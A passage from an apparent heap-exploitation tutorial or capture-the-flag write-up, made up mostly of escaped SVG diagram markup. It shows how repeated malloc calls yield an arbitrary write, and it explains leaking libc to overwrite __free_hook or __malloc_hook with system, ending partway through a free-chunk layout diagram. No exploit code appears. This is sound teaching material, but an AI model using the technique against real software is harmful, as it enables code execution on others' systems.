-0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1141px; margin-left: 501px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;b&gt;*0xFFFF12AD&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;560&quot; y=&quot;1145&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;*0xFFFF12AD&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;20&quot; y=&quot;1141&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1171px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;br &#x2F;&gt;(malloc 2)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;1175&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 180 1171 L 140 1171&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;rect x=&quot;0&quot; y=&quot;1221&quot; width=&quot;160&quot; height=&quot;40&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 1241px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Now the next malloc will return &lt;span style=&quot;text-align: center&quot;&gt;&lt;font style=&quot;font-size: 11px&quot; face=&quot;Lucida Console&quot;&gt;0xFFFF12AD.&lt;&#x2F;font&gt;&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;1245&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;Now the next malloc will r...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 1331 L 560 1331 L 560 1177.37&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 560 1172.12 L 563.5 1179.12 L 560 1177.37 L 556.5 1179.12 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;1301&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1331px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;br &#x2F;&gt;(malloc 3)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;1335&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;1381&quot; width=&quot;160&quot; height=&quot;40&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 1401px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Now we have an arbitrary write.&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;1405&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;Now we have an arbitrary w...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;h2 id=&quot;leaking-libc&quot;&gt;Leaking libc&lt;&#x2F;h2&gt;
&lt;p&gt;Even with the arbitrary write, we don&#x27;t have anything to write to. Leaking libc will allow us to overwrite &lt;code&gt;__free_hook&lt;&#x2F;code&gt; 
or &lt;code&gt;__malloc_hook&lt;&#x2F;code&gt; with a call to system. &lt;&#x2F;p&gt;
&lt;p&gt;The internal representation of a free &lt;code&gt;chunk&lt;&#x2F;code&gt; is something similar to:&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;581px&quot; height=&quot;258px&quot; viewBox=&quot;-0.5 -0.5 581 258&quot;&gt;&lt;defs&#x2F;&gt;&lt;g&gt;&lt;rect x=&quot;140&quot; y=&quot;16&quot; width=&quot;320&quot; height=&quot;240&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; stroke-dasharray=&quot;3 3&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 180 16 L 180 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 200px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;2&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;200&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;2&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 220 16 L 220 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 240px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;3&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;240&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;3&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 260 16 L 260 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 280px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;4&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;280&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;4&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 300 16 L 299.86 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 320px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;5&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;320&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;5&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 340 16 L 340 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 360px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;6&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;360&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;6&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 380 16 L 380 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 400px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;7&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;400&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;7&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 420 16 L 420 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 440px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;8&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;440&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;8&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 16 L 140 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 160px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap; &quot;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;160&quot; y=&quot;9&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;11px&quot; text-anchor=&quot;middle&quot;&gt;1&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 460 16 L 460 6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;rect x=&quot;140&quot; y=&quot;56&quot; width=&quot;200&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 198px; height: 1px; padding-top: 76px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Chunk Size&lt;br style=&quot;font-size: 6px&quot; &#x2F;&gt;&lt;font size=&quot;1&quot;&gt;(Aligned to 16 bytes - bottom 3 bits are 1)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;240&quot; y=&quot;80&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Chunk Size...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;340&quot; y=&quot;56&quot; width=&quot;40&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 341px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;A&lt;br style=&quot;font-size: 5px&quot; &#x2F;&gt;&lt;font style=&quot;font-size: 4px&quot;&gt;NON_MAIN_ARENA&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;360&quot; y=&quot;80&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;A...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;380&quot; y=&quot;56&quot; width=&quot;40&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 381px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;M&lt;br style=&quot;font-size: 7px&quot; &#x2F;&gt;&lt;font style=&quot;font-size: 4px&quot;&gt;IS_MMAPPED&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;400&quot; y=&quot;80&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;M...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;420&quot; y=&quot;56&quot; width=&quot;40&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 421px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;P&lt;br style=&quot;font-size: 7px&quot; &#x2F;&gt;&lt;font style=&quot;font-size: 4px&quot;&gt;PREV_INUSE&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;440&quot; y=&quot;80&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;P...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;140&quot; y=&quot;96&quot; width=&quot;320&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div 